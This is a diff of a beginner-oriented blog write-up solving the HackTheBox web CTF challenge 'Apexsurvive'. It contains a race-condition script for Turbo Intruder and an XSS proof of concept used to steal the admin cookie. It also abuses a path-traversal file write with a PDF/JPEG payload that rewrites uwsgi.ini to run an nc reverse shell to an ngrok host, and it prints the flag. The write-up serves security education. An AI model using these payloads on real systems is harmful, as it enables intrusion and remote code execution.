@@ -10,9 +10,9 @@ toc: true
 ## Chapter 0: Introduction
 Hey there👋. I am **Adham Elmosalamy**, a Computer Engineering student, and in this post I will walk you through my solution of **Apexsurvive**, a beautiful challenge that costed me three days of research, experimentation and sweat to take down.
 
-This is a beginner-friendly write up where I explain how web challenges like this could be approached: going over methodology, mindset and research.
+This is a beginner-friendly writeup where I explain how web challenges like this could be approached: going over methodology, mindset and research.
 
-*If you just want the solution, here is [the final attack chain.](#chapter-7-conclusion)*
+*If you just want the solution, here is [the final attack chain.](#chapter-6-the-attack-chain)*
 
 | Title       | Author  | Difficulty | Solves |
 | ----------- | ------- | ---------- | ------ |
@@ -680,7 +680,7 @@ A convenient characteristic in white-box testing is that you can research vulner
 
 Here is a good example of that: we can try to exploit the `{{ product.note | safe }}` XSS DOM sink, discovered in the previous attempt, even though we have not found a way to make it reachable yet.
 
-A quick PoC:
+A quick, local proof-of-concept:
 ```js
 ${alert("1")}` //
 ```
@@ -863,7 +863,7 @@ if __name__ == '__main__':
         print('hostname:', hostname)
 ```
 
-Outputs:
+Output:
 ```sh
 $ check.py 'hacker@apexsurvive.htb]<test@email.htb>'
 parseaddr res: ('', 'hacker@apexsurvive.htb')
@@ -1088,13 +1088,16 @@ The problem with this method is, it does not eliminate server-side jitter. In ou
 
 From the same article, turns out we could perform a last-byte sync attack using **Turbo Intruder**, a Burp Suite plugin written by Kettle himself.
 
-So, we grab Turbo Intruder and send a sample request there
-![](Pasted%20image%2020240317173412.png)
-With a bit of experimentation, I managed to get the following payload:
+> I later learnt that this feature is available in **Repeater** where you could group multiple requests before sending them in parallel.
+
+So, let's send a request over to Turbo Intruder:
+![](turbo-intruder-send.png)
+
+With a bit of experimentation, I wrote a script based off Turbo Intruder's `race-multi-endpoint` example:
 ```python
 def queueRequests(target, wordlists):
 
-    engine = RequestEngine(endpoint='https://192.168.1.253:443',
+    engine = RequestEngine(endpoint='https://192.168.1.253:1337',
                            concurrentConnections=1,
                            engine=Engine.BURP2
                            )
@@ -1111,7 +1114,6 @@ Sec-Fetch-Dest: empty
 Sec-Fetch-Mode: cors
 Sec-Fetch-Site: same-origin
 Te: trailers
-
 
 '''
 
@@ -1131,12 +1133,13 @@ Sec-Fetch-Mode: cors
 Sec-Fetch-Site: same-origin
 Te: trailers
 
-email=%s&username=aelmo&fullName=aelmo&antiCSRFToken=3f5df202-e615-4937-8ad3-be24b6e2461d
+email=%s&username=aelmo&fullName=aelmo&antiCSRFToken=3f5df202-e615-4937-8ad3-be24b6e2461d&
+
 '''
 
-    for i in range(5):
+    for i in range(10):
+	    # critical: must initialize state
         engine.queue(update_profile, 'test@email.htb', gate='race1')
-        time.sleep(0.1)
         
         engine.queue(send_verification, gate='race1')
         engine.queue(update_profile, 'attacker@apexsurvive.htb', gate='race1')
@@ -1145,18 +1148,197 @@ email=%s&username=aelmo&fullName=aelmo&antiCSRFToken=3f5df202-e615-4937-8ad3-be2
 
 def handleResponse(req, interesting):
     table.add(req)
-
 ```
 
+![](turbo-intruder-config.png)
 
+Let's launch the attack and see what we get:
+![](inbox-apexsurvive-multi.png)
 
+Out of 10 race condition attempts, we had 3 successful hits where a token intended for `attacker@apexsurvive.htb` made it to our inbox. The race condition is exploitable after all!
 
+Now, these verification tokens are not usable because they got superseded by failed attempts, this means we must stop on success to preserve elevated tokens.
 
+This is doable manually since hit chance is pretty high and I don't think it would be hard to automate it either.
 
+Anyways, we won the race, let's keep going.
 
+## Chapter 6: The Attack Chain
+With the race condition completed, let's look at our new attack chain:
+![](attack-chain-admin.png)
 
+We should be able to reach admin easily now.
+
+Starting with a normal user, we run our RC payload manually, one-by-one until we get a hit:
+![](inbox-apexsurvive-single.png)
+
+We then verify our email to unlock the **Internal Settings**
+![](internal-settings.png)
+
+We then enter a poisoned product into the system:
+![](xss-product-add.png)
+
+... and submit it to the admin bot:
+![](xss-product-reported.png)
+
+A few seconds pass, and we receive the exfiltrated admin cookie:
+![](webhook-admin-cookie.png)
+
+We hijack the admin session and unlock **Admin Settings**
+![](admin-contract.png)
+Also notice our admin username: `Xclow3n`.
+
+The next goal is RCE, but how?
+![](attack-chain-admin.png)
+
+Let's check the `/addContract` logic:
+```python
+@api.route('/addContract', methods=['POST'])
+@isAuthenticated
+@isVerified
+@isInternal
+@isAdmin
+@antiCSRF
+@sanitizeInput
+def addContract(decodedToken):
+    name = request.form.get('name', '')
+
+    uploadedFile = request.files['file']
+
+    if not uploadedFile or not name:
+        return response('All files required!')
+    
+    if uploadedFile.filename == '':
+        return response('Invalid file!')
+
+    uploadedFile.save('/tmp/temporaryUpload')
+
+    isValidPDF = checkPDF()
+
+    if isValidPDF:
+        try:
+            filePath = os.path.join(current_app.root_path, 'contracts', uploadedFile.filename)
+            with open(filePath, 'wb') as wf:
+                with open('/tmp/temporaryUpload', 'rb') as fr:
+                    wf.write(fr.read())
+
+            return response('Contract Added')
+        except Exception as e:
+            print(e, file=sys.stdout)
+            return response('Something went wrong!')
+    
+    return response('Invalid PDF! what are you trying to do?')
+```
+
+I instantly notice a vulnerable concatenation:
+```python
+os.path.join(current_app.root_path, 'contracts', uploadedFile.filename)
+```
+
+`uploadedFile.filename` is directly fed to `os.path.join` sans validation giving us an **Arbitrary File Write.**
+
+```python
+os.path.join('/root/directory1/app/', 'contracts', '/file.txt')
+'/file.txt'
+```
+
+Before our AFW code, the uploaded file gets saved to `/tmp/temporaryUpload` and a function, `checkPDF()`, is called. Let's see what `checkPDF()` does:
+```python
+def checkPDF():
+    try:
+        with open('/tmp/temporaryUpload', 'rb') as f:
+            PdfReader(f, strict=True)
+    except:
+        return False
+
+    return True
+```
+
+It's a simple function that checks if our uploaded file is a correct, parseable PDF document using `PdfReader` from `PyPDF2` in strict mode.
+
+I did some digging around but the function seems secure. There seems to be no way around uploading a valid PDF.
+
+This restricts us to an **Arbitrary PDF Write** if we may say.
+
+After some googling, searching for `uwsgi file write pdf rce` yielded this [interesting piece](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
+
+The article uses two "features" of `uwsgi` to turn arbitrary file write into code execution.
+1. `uwsgi` is very flexible when reading its own config files. It scans the configuration file for `[uwsgi]` and reads configuration from there.
+2. `uwsgi` config syntax allows for magic `@` operators, these provides convenient file reading, command execution and other powerful stuff.
+
+Thanks `uwsgi`.
+
+The article suggest embedding the weaponized `uwsgi` command within a JPEG metadata, packaging that in a PDF, then using that PDF as a payload.
+
+They kindly provide a proof-of-concept as well. Let's get to work
+
+We set up our listeners:
+![](listener-setup.png)
+
+Let's weaponize an innocent `flower.jpg`, notice how the payload pads the JPEG metadata with newlines:
+```python
+from fpdf import FPDF
+from exiftool import ExifToolHelper
+
+with ExifToolHelper() as et:
+    et.set_tags(
+        ["flower.jpg"],
+        tags={"model": "&#x0a;[uwsgi]&#x0a;foo = @(exec://nc 6.tcp.eu.ngrok.io 13278 -e sh)&#x0a;"},
+        params=["-E", "-overwrite_original"]
+    )
+
+class MyFPDF(FPDF):
+    pass
+
+pdf = MyFPDF()
+
+pdf.add_page()
+pdf.image('./flower.jpg')
+pdf.output('payload.pdf', 'F')
+```
+
+Payload generation screenshot for extra immersion:
+![](gen-pdf.png)
+
+This is our payload, can't be malicious, right?
+![](pdf-payload.png)
+
+We upload the request through Repeater, setting the filename to `/app/uwsgi.ini` to overwrite `uwsgi`'s config file:
+![](repeater-pdf-rce.png)
+
+Notice how the image metadata (with our `uwsgi` command) are stored as plaintext within the otherwise encoded PDF.
+
+To trigger the command, we must reload `uwsgi` by modifying a python source file within the application, this is a debug feature enabled in the currently loaded `uwsgi.ini` through:
+```
+py-autoreload = 3
+```
+
+Let's just overwrite any file say `/app/application/database.py`, sending our request and...
+![](flag.png)
+
+`HTB{0H_c0m3_0n_r4c3_c0nd1t10n_4nd_C55_1nj3ct10n_15_F1R3}`
+![](attack-chain-complete.png)
 
 ## Chapter 7: Conclusion
-A major part of why I found this challenge extremely interesting, and challenging, is the fact that I have never exploited a race condition before. I genuinely did not know that's a *thing* you could exploit.
+This challenge became an instant favorite. It is the most challenging and, by extension, rewarding, web challenge I've ever solved.
 
-I was confident that gaining `isInternal` **is** the way to successfully exploit our chain and I have eliminated all other approaches. If there is a way, this has to be it.
+Indeed, the steps seem pretty straightforward now, but the "uncertainty management" aspect we discussed is what make security research a time consuming exercise. You don't know what you are expecting until you find it, and you need lots of grit and confidence to get there.
+
+Another major part of why I found this challenge extremely interesting is the fact that I have never exploited a race condition before. I genuinely did not know that's a *thing* you could do.
+
+It was a mental game more than anything else, me versus a piece of logic.
+
+At some point, and through a game of elimination, I reached a strong conviction that the only route has to be through `isInternal`.
+
+Again, and through a long-winded game of elimination, I reached a conviction that the only way to get `isInternal` is a race condition. I got fixated on the race condition, then I pulled it off.
+
+Visual proof of a late-night conviction 😅: 
+![](discord.png)
+
+On a second note, there was so much tangential research that I have not included in this writeup, but that does not mean it was useless. The most rewarding aspect of CTFs are these little, educational journeys you take doing seemingly irrelevant, tangential research.
+
+CTF after CTF and challenge after challenge, you realize you have accumulated a good variety of information, about seemingly random things, and evidently, that variety is what creates a resourceful, solid cybersecurity engineer.
+
+Also big thanks to my team **PwnSec** for the support, it was beautiful to see the team effort as we collaborated on different categories.
+
+That's all I got for today, see you in the next one.
